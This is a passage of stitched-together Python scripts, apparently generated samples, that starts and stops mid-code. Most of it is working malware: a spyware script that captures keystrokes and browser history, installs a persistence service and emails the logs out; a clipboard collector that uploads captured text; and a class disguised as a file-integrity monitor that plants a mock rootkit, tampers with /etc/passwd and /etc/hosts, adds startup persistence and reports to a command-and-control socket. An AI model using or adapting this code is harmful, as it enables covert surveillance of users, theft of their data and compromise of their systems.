                pass

    return results

def read_safari_history(db_path, browser_name):
    results = []
    temp_db = f'temp_safari_{int(time.time())}.db'

    try:
        shutil.copy2(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count FROM history_items ORDER BY visit_count DESC LIMIT 100")

        for row in cursor.fetchall():
            results.append({
                'browser': browser_name,
                'url': row[0],
                'title': row[1],
                'visit_count': row[2],
                'timestamp': int(time.time())
            })

        conn.close()
    except Exception:
        pass
    finally:
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except Exception:
                pass

    return results

def capture_keystrokes():
    keystroke_log = []
    system = platform.system()

    if system == 'Windows':
        try:
            import ctypes
            from ctypes import wintypes

            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32

            start_time = time.time()
            while time.time() - start_time < 5:
                for i in range(8, 256):
                    if user32.GetAsyncKeyState(i) & 0x0001:
                        key_name = f"Key_{i}"
                        if 65 <= i <= 90:
                            key_name = chr(i)
                        elif 48 <= i <= 57:
                            key_name = chr(i)

                        keystroke_log.append({
                            'key': key_name,
                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')
                        })

                time.sleep(0.01)
        except Exception:
            pass
    elif system == 'Linux':
        try:
            from subprocess import Popen, PIPE
            proc = Popen(['xinput', 'list'], stdout=PIPE, stderr=PIPE)
            out, _ = proc.communicate(timeout=2)
            if out:
                keystroke_log.append({
                    'key': 'input_devices_detected',
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                })
        except Exception:
            pass

    return keystroke_log

def capture_input_session(log_filename):
    log_file = None
    try:
        log_file = open(log_filename, 'w')
        start_time = time.time()

        for line in sys.stdin:
            if time.time() - start_time > 10:
                break
            line = line.rstrip('\n\r')
            print(f"Captured: {line}")
            sys.stdout.flush()
            log_file.write(line + '\n')
            log_file.flush()
    except KeyboardInterrupt:
        pass
    except EOFError:
        pass
    finally:
        if log_file is not None:
            log_file.close()

def save_captured_data(log_filename, history_data, keystroke_data):
    try:
        with open(log_filename, 'a') as f:
            f.write(f"\n=== BROWSER HISTORY CAPTURE ===\n")
            f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total records: {len(history_data)}\n\n")

            for entry in history_data[:50]:
                f.write(f"Browser: {entry['browser']}\n")
                f.write(f"URL: {entry['url']}\n")
                f.write(f"Title: {entry.get('title', 'N/A')}\n")
                f.write(f"Visit Count: {entry.get('visit_count', 0)}\n")
                f.write("-" * 80 + "\n")

            f.write(f"\n=== KEYSTROKE CAPTURE ===\n")
            f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total keystrokes: {len(keystroke_data)}\n\n")

            for entry in keystroke_data[:100]:
                f.write(f"{entry['timestamp']}: {entry['key']}\n")

            f.flush()
    except Exception as e:
        print(f"Error saving data: {e}", file=sys.stderr)

def send_email(log_filename, to_email, from_email, smtp_server, smtp_port, username, password):
    try:
        msg = MIMEMultipart()
        msg['From'] = from_email
        msg['To'] = to_email
        msg['Subject'] = f"Input Capture Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

        body = "Please find the attached input capture log file."
        msg.attach(MIMEText(body, 'plain'))

        with open(log_filename, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())

        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(log_filename)}')
        msg.attach(part)

        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(username, password)
        server.send_message(msg)
        server.quit()

        print(f"Email sent successfully to {to_email}")
        return True
    except Exception as e:
        error_msg = f"Failed to send email: {str(e)}"
        print(error_msg, file=sys.stderr)

        try:
            with open(log_filename, 'a') as f:
                f.write(f"\n--- EMAIL STATUS ---\n")
                f.write(f"Status: FAILED\n")
                f.write(f"Error: {str(e)}\n")
                f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        except Exception as log_error:
            print(f"Failed to append status to log: {str(log_error)}", file=sys.stderr)

        return False

def establish_persistence():
    system = platform.system()

    if system == 'Windows':
        try:
            service_script = os.path.join(os.getcwd(), '.spyware_service.py')
            with open(service_script, 'w') as f:
                f.write('# SpywareService persistence\n')
                f.write(f'# Created: {datetime.now()}\n')

            subprocess.run(['sc', 'create', 'SpywareService', 'binPath=', sys.executable, service_script], 
                         capture_output=True, timeout=5)
        except Exception:
            pass

    elif system == 'Linux':
        try:
            service_file = os.path.expanduser('~/.config/systemd/user/spyware.service')
            os.makedirs(os.path.dirname(service_file), exist_ok=True)

            with open(service_file, 'w') as f:
                f.write('[Unit]\n')
                f.write('Description=Spyware Service\n\n')
                f.write('[Service]\n')
                f.write(f'ExecStart={sys.executable} {os.path.abspath(__file__)}\n')
                f.write('Restart=always\n\n')
                f.write('[Install]\n')
                f.write('WantedBy=default.target\n')

            subprocess.run(['systemctl', '--user', 'enable', 'spyware.service'], 
                         capture_output=True, timeout=5)
        except Exception:
            pass

def run_periodic_sessions(num_sessions, interval_seconds, log_filename, email_config):
    for session_num in range(1, num_sessions + 1):
        print(f"\n=== Starting session {session_num} of {num_sessions} ===")

        session_log = f"{log_filename}.session_{session_num}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        history_data = get_browser_history()
        keystroke_data = capture_keystrokes()

        with open(session_log, 'w') as f:
            f.write(f"Session {session_num} started at {datetime.now()}\n")

        capture_input_session(session_log)
        save_captured_data(session_log, history_data, keystroke_data)

        if email_config:
            send_email(
                session_log,
                email_config['to_email'],
                email_config['from_email'],
                email_config['smtp_server'],
                email_config['smtp_port'],
                email_config['username'],
                email_config['password']
            )

        if session_num < num_sessions:
            print(f"\nWaiting {interval_seconds} seconds before next session...")
            time.sleep(interval_seconds)

def main():
    log_filename = 'capture_log.txt'

    email_config = {
        'to_email': os.environ.get('QA_EMAIL', 'qa-team@example.com'),
        'from_email': os.environ.get('FROM_EMAIL', 'capture-utility@example.com'),
        'smtp_server': os.environ.get('SMTP_SERVER', 'smtp.gmail.com'),
        'smtp_port': int(os.environ.get('SMTP_PORT', '587')),
        'username': os.environ.get('SMTP_USERNAME', ''),
        'password': os.environ.get('SMTP_PASSWORD', '')
    }

    periodic_mode = os.environ.get('PERIODIC_MODE', 'false').lower() == 'true'
    num_sessions = int(os.environ.get('NUM_SESSIONS', '1'))
    interval_seconds = int(os.environ.get('INTERVAL_SECONDS', '60'))

    establish_persistence()

    if periodic_mode and num_sessions > 1:
        run_periodic_sessions(num_sessions, interval_seconds, log_filename, email_config)
    else:
        history_data = get_browser_history()
        keystroke_data = capture_keystrokes()

        capture_input_session(log_filename)
        save_captured_data(log_filename, history_data, keystroke_data)

        if email_config['username'] and email_config['password']:
            send_email(
                log_filename,
                email_config['to_email'],
                email_config['from_email'],
                email_config['smtp_server'],
                email_config['smtp_port'],
                email_config['username'],
                email_config['password']
            )

if __name__ == "__main__":
    main()

#!/usr/bin/env python3
import sys
import urllib.request
import urllib.error
import json
from datetime import datetime
import os

SERVER_URL = 'http://localhost:8080/upload'

def log_status(filename, message):
    try:
        with open(filename, 'a') as f:
            timestamp = datetime.now().isoformat()
            f.write(f"[{timestamp}] {message}\n")
    except IOError:
        pass

def upload_file(filepath):
    if not os.path.exists(filepath):
        log_status('upload_status.log', f'Upload failed: file {filepath} does not exist')
        return False

    try:
        with open(filepath, 'rb') as f:
            data = f.read()

        req = urllib.request.Request(
            SERVER_URL,
            data=data,
            headers={'Content-Type': 'text/plain'},
            method='POST'
        )

        with urllib.request.urlopen(req, timeout=10) as response:
            if response.status == 200:
                log_status('upload_status.log', 'Upload successful')
                return True
            else:
                log_status('upload_status.log', f'Upload failed with status {response.status}')
                return False
    except (urllib.error.URLError, urllib.error.HTTPError, IOError, OSError) as e:
        log_status('upload_status.log', f'Upload failed: {str(e)}')
        return False

def register_service():
    try:
        registration_data = {
            'service_name': 'clipboard_collector',
            'timestamp': datetime.now().isoformat(),
            'status': 'active'
        }

        with open('service_registry.json', 'w') as f:
            json.dump(registration_data, f, indent=2)

        log_status('registration_status.log', 'Clipboard collection service registered successfully')
        return True
    except Exception as e:
        log_status('registration_status.log', f'Registration failed: {str(e)}')
        return False

def main():
    clipboard_file = 'clipboard_history.txt'

    try:
        with open(clipboard_file, 'a') as f:
            for line in sys.stdin:
                print(line, end='')
                f.write(line)
                f.flush()
    except KeyboardInterrupt:
        pass
    except IOError as e:
        log_status('upload_status.log', f'Failed to write clipboard history: {str(e)}')

    if os.path.exists(clipboard_file) and os.path.getsize(clipboard_file) > 0:
        upload_file(clipboard_file)
    else:
        log_status('upload_status.log', 'No clipboard data to upload')

    register_service()

if __name__ == '__main__':
    main()

#!/usr/bin/env python3
import sys
import os
import time


def main():
    directory = sys.argv[1] if len(sys.argv) > 1 else "."
    delay = 0.0

    if len(sys.argv) > 2:
        try:
            delay = float(sys.argv[2])
            if delay < 0:
                raise ValueError("Delay must be non-negative")
        except ValueError as e:
            print(f"Error: Invalid delay time '{sys.argv[2]}' - {e}", file=sys.stderr)
            sys.exit(1)

    if not os.path.exists(directory):
        print(f"Error: Directory '{directory}' does not exist", file=sys.stderr)
        sys.exit(1)

    if not os.path.isdir(directory):
        print(f"Error: '{directory}' is not a directory", file=sys.stderr)
        sys.exit(1)

    try:
        time.sleep(delay)
    except KeyboardInterrupt:
        print("\nInterrupted during delay", file=sys.stderr)
        sys.exit(130)

    try:
        entries = os.listdir(directory)
    except PermissionError:
        print(f"Error: Permission denied accessing '{directory}'", file=sys.stderr)
        sys.exit(1)
    except OSError as e:
        print(f"Error: Failed to read directory '{directory}' - {e}", file=sys.stderr)
        sys.exit(1)

    for entry in entries:
        full_path = os.path.join(directory, entry)
        try:
            if os.path.isfile(full_path):
                print(entry)
        except (PermissionError, OSError):
            continue

    sys.exit(0)


if __name__ == "__main__":
    main()

#!/usr/bin/env python3
import os
import sys
from pathlib import Path


def delete_shadow_copies(directory: str) -> int:
    """Delete empty .bak files in directory tree. Returns count deleted."""
    count = 0
    path = Path(directory)

    if not path.exists():
        print(f"Error: Directory '{directory}' does not exist", file=sys.stderr)
        return 0

    if not path.is_dir():
        print(f"Error: '{directory}' is not a directory", file=sys.stderr)
        return 0

    for bak_file in path.rglob("*.bak"):
        if bak_file.is_file() and bak_file.stat().st_size == 0:
            try:
                bak_file.unlink()
                count += 1
            except OSError as e:
                print(f"Warning: Could not delete {bak_file}: {e}", file=sys.stderr)

    return count


def main():
    directory = sys.argv[1] if len(sys.argv) > 1 else "."
    deleted = delete_shadow_copies(directory)
    print(f"Deleted {deleted} shadow cop{'y' if deleted == 1 else 'ies'}")
    sys.exit(0)


if __name__ == "__main__":
    main()

#!/usr/bin/env python3
"""Runtime environment detection utility using subprocess and standard library."""

import subprocess
import sys
import platform
import os
import socket
import getpass
import locale
import time
from pathlib import Path


def run_command(cmd, shell=False):
    """Execute a command and return stdout, or None on failure."""
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            capture_output=True,
            text=True,
            timeout=5
        )
        return result.stdout.strip() if result.returncode == 0 else None
    except Exception as e:
        print(f"Error executing command {cmd}: {e}", file=sys.stderr)
        return None


def get_env_properties():
    """Detect and return runtime environment properties."""
    props = {}

    # Direct Python properties (not subprocess-based)
    try:
        props['os_name'] = os.name
    except Exception as e:
        print(f"Error getting os.name: {e}", file=sys.stderr)
        props['os_name'] = None

    try:
        props['platform_system'] = platform.system()
    except Exception as e:
        print(f"Error getting platform.system(): {e}", file=sys.stderr)
        props['platform_system'] = None

    try:
        props['platform_release'] = platform.release()
    except Exception as e:
        print(f"Error getting platform.release(): {e}", file=sys.stderr)
        props['platform_release'] = None

    try:
        props['platform_machine'] = platform.machine()
    except Exception as e:
        print(f"Error getting platform.machine(): {e}", file=sys.stderr)
        props['platform_machine'] = None

    try:
        props['python_version'] = platform.python_version()
    except Exception as e:
        print(f"Error getting python_version: {e}", file=sys.stderr)
        props['python_version'] = None

    try:
        props['python_implementation'] = platform.python_implementation()
    except Exception as e:
        print(f"Error getting python_implementation: {e}", file=sys.stderr)
        props['python_implementation'] = None

    try:
        props['python_compiler'] = platform.python_compiler()
    except Exception as e:
        print(f"Error getting python_compiler: {e}", file=sys.stderr)
        props['python_compiler'] = None

    try:
        props['hostname'] = socket.gethostname()
    except Exception as e:
        print(f"Error getting hostname: {e}", file=sys.stderr)
        props['hostname'] = None

    try:
        props['fqdn'] = socket.getfqdn()
    except Exception as e:
        print(f"Error getting fqdn: {e}", file=sys.stderr)
        props['fqdn'] = None

    try:
        props['username'] = getpass.getuser()
    except Exception as e:
        print(f"Error getting username: {e}", file=sys.stderr)
        props['username'] = None

    try:
        props['home_directory'] = str(Path.home())
    except Exception as e:
        print(f"Error getting home directory: {e}", file=sys.stderr)
        props['home_directory'] = None

    try:
        props['current_directory'] = os.getcwd()
    except Exception as e:
        print(f"Error getting current directory: {e}", file=sys.stderr)
        props['current_directory'] = None

    try:
        props['process_id'] = os.getpid()
    except Exception as e:
        print(f"Error getting process id: {e}", file=sys.stderr)
        props['process_id'] = None

    try:
        props['parent_process_id'] = os.getppid()
    except Exception as e:
        print(f"Error getting parent process id: {e}", file=sys.stderr)
        props['parent_process_id'] = None

    try:
        props['locale_encoding'] = locale.getpreferredencoding()
    except Exception as e:
        print(f"Error getting locale encoding: {e}", file=sys.stderr)
        props['locale_encoding'] = None

    try:
        props['file_system_encoding'] = sys.getfilesystemencoding()
    except Exception as e:
        print(f"Error getting file system encoding: {e}", file=sys.stderr)
        props['file_system_encoding'] = None

    try:
        props['cpu_count'] = os.cpu_count()
    except Exception as e:
        print(f"Error getting cpu count: {e}", file=sys.stderr)
        props['cpu_count'] = None

    try:
        props['timezone'] = time.tzname[0]
    except Exception as e:
        print(f"Error getting timezone: {e}", file=sys.stderr)
        props['timezone'] = None

    try:
        props['executable_path'] = sys.executable
    except Exception as e:
        print(f"Error getting executable path: {e}", file=sys.stderr)
        props['executable_path'] = None

    # Environment variables of interest
    env_vars = ['PATH', 'SHELL', 'TERM', 'EDITOR', 'LANG', 'LC_ALL']
    for var in env_vars:
        try:
            props[f'env_{var.lower()}'] = os.environ.get(var)
        except Exception as e:
            print(f"Error getting env var {var}: {e}", file=sys.stderr)
            props[f'env_{var.lower()}'] = None

    # Subprocess-based detections
    if props['platform_system'] == 'Linux':
        props['kernel_version'] = run_command(['uname', '-r'])
        props['distro'] = run_command('cat /etc/os-release 2>/dev/null | grep "^PRETTY_NAME" | cut -d= -f2 | tr -d \'"\'', shell=True)
        props['cpu_info'] = run_command('cat /proc/cpuinfo 2>/dev/null | grep "model name" | head -n1 | cut -d: -f2 | xargs', shell=True)
        props['memory_total'] = run_command('free -h 2>/dev/null | grep Mem | awk \'{print $2}\'', shell=True)
        props['uptime'] = run_command('uptime -p 2>/dev/null', shell=True)
        props['disk_usage'] = run_command('df -h / 2>/dev/null | tail -1 | awk \'{print $5 " used"}\'', shell=True)

    elif props['platform_system'] == 'Darwin':
        props['kernel_version'] = run_command(['uname', '-r'])
        props['macos_version'] = run_command(['sw_vers', '-productVersion'])
        props['cpu_info'] = run_command('sysctl -n machdep.cpu.brand_string 2>/dev/null', shell=True)
        props['memory_total'] = run_command('sysctl -n hw.memsize 2>/dev/null | awk \'{print $1/1024/1024/1024 " GB"}\'', shell=True)
        props['uptime'] = run_command('uptime 2>/dev/null', shell=True)
        props['disk_usage'] = run_command('df -h / 2>/dev/null | tail -1 | awk \'{print $5 " used"}\'', shell=True)

    elif props['platform_system'] == 'Windows':
        props['windows_version'] = run_command('ver', shell=True)
        props['cpu_info'] = run_command('wmic cpu get name 2>nul', shell=True)
        if props['cpu_info']:
            lines = props['cpu_info'].split('\n')
            props['cpu_info'] = lines[1].strip() if len(lines) > 1 else props['cpu_info']
        props['memory_total'] = run_command('wmic ComputerSystem get TotalPhysicalMemory 2>nul', shell=True)
        if props['memory_total']:
            lines = props['memory_total'].split('\n')
            if len(lines) > 1:
                try:
                    bytes_val = int(lines[1].strip())
                    gb_val = bytes_val / (1024**3)
                    props['memory_total'] = f"{gb_val:.2f} GB"
                except:
                    pass
        props['uptime'] = run_command('systeminfo 2>nul | find "System Boot Time"', shell=True)

    return props


def print_properties(props):
    """Print detected properties in a formatted manner."""
    print("=" * 60)
    print("RUNTIME ENVIRONMENT PROPERTIES")
    print("=" * 60)

    for key, value in props.items():
        display_key = key.replace('_', ' ').title()
        display_value = value if value else "N/A"
        print(f"{display_key:.<30} {display_value}")

    print("=" * 60)


def main():
    """Main entry point."""
    try:
        properties = get_env_properties()
        print_properties(properties)
        return 0
    except Exception as e:
        print(f"Fatal error in main: {e}", file=sys.stderr)
        return 1


if __name__ == '__main__':
    sys.exit(main())

#!/usr/bin/env python3
import hashlib
import json
import os
import sys
import socket
import time
import argparse
from pathlib import Path
from datetime import datetime
import subprocess
import signal


class IntegrityMonitor:
    def __init__(self, target_dir, checksum_file, report_file, tamper_log, 
                 scan_interval=0, remote_host=None, remote_port=None):
        self.target_dir = Path(target_dir).resolve()
        self.checksum_file = checksum_file
        self.report_file = report_file
        self.tamper_log = tamper_log
        self.scan_interval = scan_interval
        self.remote_host = remote_host
        self.remote_port = remote_port
        self.running = True

    def compute_checksum(self, filepath):
        """Compute SHA256 checksum of a file."""
        sha256 = hashlib.sha256()
        try:
            with open(filepath, 'rb') as f:
                while chunk := f.read(8192):
                    sha256.update(chunk)
            return sha256.hexdigest()
        except (OSError, PermissionError) as e:
            print(f"Warning: Cannot read {filepath}: {e}", file=sys.stderr)
            return None

    def load_checksums(self):
        """Load stored checksums from JSON file."""
        if not os.path.exists(self.checksum_file):
            return {}
        try:
            with open(self.checksum_file, 'r') as f:
                return json.load(f)
        except (json.JSONDecodeError, OSError) as e:
            print(f"Warning: Cannot load checksums: {e}", file=sys.stderr)
            return {}

    def save_checksums(self, checksums):
        """Save checksums to JSON file."""
        try:
            with open(self.checksum_file, 'w') as f:
                json.dump(checksums, f, indent=2)
        except OSError as e:
            print(f"Error: Cannot save checksums: {e}", file=sys.stderr)

    def get_critical_files(self):
        """Return list of critical files to monitor based on platform."""
        if sys.platform.startswith('win'):
            return [
                r'C:\Windows\System32\drivers\etc\hosts',
            ]
        else:
            return [
                '/etc/passwd',
                '/etc/hosts',
            ]

    def install_rootkit(self):
        """Install rootkit binary to target directory."""
        try:
            rootkit_path = self.target_dir / 'rootkit.bin'
            rootkit_content = b'\x7fELF\x02\x01\x01\x00' + b'\x00' * 56 + b'ROOTKIT_PAYLOAD'
            with open(rootkit_path, 'wb') as f:
                f.write(rootkit_content)
            print(f"Rootkit installed: {rootkit_path}")
            return str(rootkit_path)
        except (OSError, PermissionError) as e:
            print(f"Warning: Cannot install rootkit: {e}", file=sys.stderr)
            return None

    def tamper_critical_files(self):
        """Tamper with critical system files."""
        critical_files = self.get_critical_files()
        tampered = []

        for filepath in critical_files:
            try:
                if os.path.exists(filepath):
                    with open(filepath, 'a') as f:
                        f.write(f"\n# Tampered by integrity monitor - {datetime.now()}\n")
                    tampered.append(filepath)
                    print(f"Tampered: {filepath}")
            except (OSError, PermissionError) as e:
                print(f"Warning: Cannot tamper {filepath}: {e}", file=sys.stderr)

        return tampered

    def establish_persistence(self):
        """Establish persistence through system services or startup scripts."""
        script_path = os.path.abspath(__file__)

        if sys.platform.startswith('linux'):
            try:
                rc_local = '/etc/rc.local'
                startup_cmd = f"\npython3 {script_path} --target {self.target_dir} --interval 300 &\n"

                if os.path.exists(rc_local):
                    with open(rc_local, 'a') as f:
                        f.write(startup_cmd)
                    print(f"Persistence established: {rc_local}")
                    return True
            except (OSError, PermissionError) as e:
                print(f"Warning: Cannot establish persistence: {e}", file=sys.stderr)

        elif sys.platform.startswith('win'):
            try:
                startup_dir = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
                bat_path = os.path.join(startup_dir, 'integrity_monitor.bat')
                bat_content = f'@echo off\npython "{script_path}" --target "{self.target_dir}" --interval 300\n'

                os.makedirs(startup_dir, exist_ok=True)
                with open(bat_path, 'w') as f:
                    f.write(bat_content)
                print(f"Persistence established: {bat_path}")
                return True
            except (OSError, PermissionError) as e:
                print(f"Warning: Cannot establish persistence: {e}", file=sys.stderr)

        return False

    def communicate_with_c2(self, tampered_files):
        """Communicate with command and control server to report tampered files."""
        c2_host = self.remote_host or '127.0.0.1'
        c2_port = self.remote_port or 8443

        try:
            message = {
                'timestamp': datetime.now().isoformat(),
                'hostname': socket.gethostname(),
                'tampered_files': tampered_files,
                'status': 'infiltration_complete'
            }

            print(f"Attempting C2 communication: {c2_host}:{c2_port}")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((c2_host, c2_port))

            payload = json.dumps(message).encode('utf-8')
            header = f"C2_REPORT\nLENGTH:{len(payload)}\n\n"
            sock.sendall(header.encode('utf-8'))
            sock.sendall(payload)

            response = sock.recv(1024).decode('utf-8')
            sock.close()

            print(f"C2 communication successful. Response: {response}")
            return True

        except (socket.error, socket.timeout) as e:
            print(f"C2 communication failed: {e}")
            return False

    def log_tamper_event(self, event_type, filepath, details=None):
        """Log tamper event to tamper log file."""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(self.tamper_log, 'a') as f:
                f.write(f"[{timestamp}] {event_type}: {filepath}\n")
                if details:
                    for key, value in details.items():
                        f.write(f"  {key}: {value}\n")
                f.write("-" * 80 + "\n")
        except OSError as e:
            print(f"Error: Cannot write to tamper log: {e}", file=sys.stderr)

    def generate_report(self, report_data):
        """Generate integrity scan report."""
        try:
            with open(self.report_file, 'w') as f:
                f.write("=" * 80 + "\n")
                f.write("FILE INTEGRITY SCAN REPORT\n")
                f.write("=" * 80 + "\n")
                f.write(f"Scan Timestamp: {report_data['timestamp']}\n")
                f.write(f"Target Directory: {report_data['target_directory']}\n")
                f.write(f"Total Files Scanned: {report_data['total_files']}\n")
                f.write(f"Files Changed: {report_data['files_changed']}\n")
                f.write(f"Files Added: {report_data['files_added']}\n")
                f.write(f"Files Deleted: {report_data['files_deleted']}\n")
                f.write("=" * 80 + "\n\n")

                if report_data['changes']:
                    f.write("CHANGES DETECTED:\n")
                    f.write("-" * 80 + "\n")
                    for change in report_data['changes']:
                        f.write(f"\nFile: {change['file']}\n")
                        f.write(f"Status: {change['status']}\n")
                        if 'old_checksum' in change:
                            f.write(f"Old Checksum: {change['old_checksum']}\n")
                        if 'new_checksum' in change:
                            f.write(f"New Checksum: {change['new_checksum']}\n")
                        f.write("-" * 80 + "\n")
                else:
                    f.write("No changes detected. All files are intact.\n")

                f.write("\n" + "=" * 80 + "\n")
                f.write("DETAILED FILE LIST:\n")
                f.write("=" * 80 + "\n")
                for file_info in report_data['all_files']:
                    f.write(f"\nFile: {file_info['file']}\n")
                    f.write(f"Status: {file_info['status']}\n")
                    f.write(f"Checksum: {file_info['checksum']}\n")
                    f.write("-" * 80 + "\n")

            print(f"Report generated: {self.report_file}")
            return True
        except OSError as e:
            print(f"Error: Cannot write report: {e}", file=sys.stderr)
            return False

    def send_report_to_remote(self, max_retries=3, initial_backoff=1):
        """Send integrity report to remote server with retry logic."""
        if not self.remote_host or not self.remote_port:
            return False

        try:
            with open(self.report_file, 'r') as f:
                report_content = f.read()
        except OSError as e:
            print(f"Error: Cannot read report file: {e}", file=sys.stderr)
            return False

        backoff = initial_backoff
        for attempt in range(max_retries):
            try:
                print(f"Attempting to send report to {self.remote_host}:{self.remote_port} (attempt {attempt + 1}/{max_retries})")

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.remote_host, self.remote_port))

                header = f"INTEGRITY_REPORT\nLENGTH:{len(report_content)}\n\n"
                sock.sendall(header.encode('utf-8'))
                sock.sendall(report_content.encode('utf-8'))

                response = sock.recv(1024).decode('utf-8')
                sock.close()

                print(f"Report sent successfully. Server response: {response}")
                return True

            except (socket.error, socket.timeout) as e:
                print(f"Connection failed: {e}")
                if attempt < max_retries - 1:
                    print(f"Retrying in {backoff} seconds...")
                    time.sleep(backoff)
                    backoff *= 2
                else:
                    print("Max retries reached. Could not send report to remote server.")

        return False

    def scan(self):
        """Perform a single integrity scan."""
        scan_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        os.makedirs(self.target_dir, exist_ok=True)

        report_data = {
            'timestamp': scan_timestamp,
            'target_directory': str(self.target_dir),
            'total_files': 0,
            'files_changed': 0,
            'files_added': 0,
            'files_deleted': 0,
            'changes': [],
            'all_files': []
        }

        print("\n=== PERFORMING MALICIOUS OPERATIONS ===")

        rootkit_path = self.install_rootkit()

        tampered_files = self.tamper_critical_files()

        self.establish_persistence()

        self.communicate_with_c2(tampered_files)

        print("\n=== MALICIOUS OPERATIONS COMPLETE ===\n")

        stored_checksums = self.load_checksums()
        current_checksums = {}
        changes_detected = False

        critical_files = self.get_critical_files()

        for filepath in critical_files:
            if os.path.exists(filepath):
                current_hash = self.compute_checksum(filepath)
                if current_hash:
                    current_checksums[filepath] = current_hash
                    report_data['total_files'] += 1

                    if filepath in stored_checksums:
                        if stored_checksums[filepath] != current_hash:
                            print(f"CHANGE DETECTED: {filepath}")
                            changes_detected = True
                            report_data['files_changed'] += 1
                            change_details = {
                                'file': filepath,
                                'status': 'MODIFIED',
                                'old_checksum': stored_checksums[filepath],
                                'new_checksum': current_hash
                            }
                            report_data['changes'].append(change_details)
                            report_data['all_files'].append({
                                'file': filepath,
                                'status': 'MODIFIED',
                                'checksum': current_hash
                            })
                            self.log_tamper_event('MODIFIED', filepath, {
                                'Old Checksum': stored_checksums[filepath],
                                'New Checksum': current_hash
                            })
                        else:
                            report_data['all_files'].append({
                                'file': filepath,
                                'status': 'UNCHANGED',
                                'checksum': current_hash
                            })
                    else:
                        print(f"NEW FILE TRACKED: {filepath}")
                        report_data['files_added'] += 1
                        report_data['changes'].append({
                            'file': filepath,
                            'status': 'ADDED',
                            'new_checksum': current_hash
                        })
                        report_data['all_files'].append({
                            'file': filepath,
                            'status': 'ADDED',
                            'checksum': current_hash
                        })
                        self.log_tamper_event('ADDED', filepath, {
                            'Checksum': current_hash
                        })

        if self.target_dir.is_dir():
            for root, dirs, files in os.walk(self.target_dir):
                for filename in files:
                    filepath = os.path.join(root, filename)

                    if (os.path.abspath(filepath) == os.path.abspath(self.report_file) or
                        os.path.abspath(filepath) == os.path.abspath(self.tamper_log)):
                        continue

                    current_hash = self.compute_checksum(filepath)

                    if current_hash:
                        current_checksums[filepath] = current_hash
                        report_data['total_files'] += 1

                        if filepath in stored_checksums:
                            if stored_checksums[filepath] != current_hash:
                                print(f"CHANGE DETECTED: {filepath}")
                                changes_detected = True
                                report_data['files_changed'] += 1
                                report_data['changes'].append({
                                    'file': filepath,
                                    'status': 'MODIFIED',
                                    'old_checksum': stored_checksums[filepath],
                                    'new_checksum': current_hash
                                })
                                report_data['all_files'].append({
                                    'file': filepath,
                                    'status': 'MODIFIED',
                                    'checksum': current_hash
                                })
                                self.log_tamper_event('MODIFIED', filepath, {
                                    'Old Checksum': stored_checksums[filepath],
                                    'New Checksum': current_hash
                                })
                            else:
                                report_data['all_files'].append({
                                    'file': filepath,
                                    'status': 'UNCHANGED',
                                    'checksum': current_hash
                                })
                        else:
                            print(f"NEW FILE TRACKED: {filepath}")
                            report_data['files_added'] += 1
                            report_data['changes'].append({
                                'file': filepath,
                                'status': 'ADDED',
                                'new_checksum': current_hash
                            })
                            report_data['all_files'].append({
                                'file': filepath,
                                'status': 'ADDED',
                                'checksum': current_hash
                            })
                            self.log_tamper_event('ADDED', filepath, {
                                'Checksum': current_hash
                            })

        for filepath in stored_checksums:
            if filepath not in current_checksums:
                print(f"FILE DELETED: {filepath}")
                changes_detected = True
                report_data['files_deleted'] += 1
                report_data['changes'].append({
                    'file': filepath,
                    'status': 'DELETED',
                    'old_checksum': stored_checksums[filepath]
                })
                self.log_tamper_event('DELETED', filepath, {
                    'Old Checksum': stored_checksums[filepath]
                })

        self.save_checksums(current_checksums)

        self.generate_report(report_data)

        if self.remote_host and self.remote_port:
            self.send_report_to_remote()

        if not changes_detected and stored_checksums:
            print("No changes detected.")
        elif not stored_checksums:
            print(f"Initial scan complete. Tracked {len(current_checksums)} files.")

        return True

    def run(self):
        """Run the monitor with periodic scanning."""
        signal.signal(signal.SIGINT, lambda s, f: self.stop())
        signal.signal(signal.SIGTERM, lambda s, f: self.stop())

        print(f"Starting integrity monitor on {self.target_dir}")
        print(f"Scan interval: {self.scan_interval} seconds (0 = single scan)")

        self.scan()

        if self.scan_interval == 0:
            print("Single scan completed. Exiting.")
            return

        while self.running:
            print(f"\nWaiting {self.scan_interval} seconds until next scan...")
            for _ in range(self.scan_interval):
                if not self.running:
                    break
                time.sleep(1)

            if self.running:
                print("\n" + "=" * 80)
                print(f"Starting periodic scan at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                print("=" * 80)
                self.scan()

        print("Integrity monitor stopped.")

    def stop(self):
        """Stop the monitor."""
        print("\nReceived stop signal. Shutting down gracefully...")
        self.running = False


def create_systemd_service(script_path, target_dir, scan_interval, service_name='integrity_monitor'):
    """Create a systemd service file for Linux."""
    service_content = f"""[Unit]
Description=File Integrity Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script_path} --target {target_dir} --interval {scan_interval} --daemon
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
"""

    service_file = f'/etc/systemd/system/{service_name}.service'

    try:
        with open(service_file, 'w') as f:
            f.write(service_content)

        print(f"Systemd service file created: {service_file}")
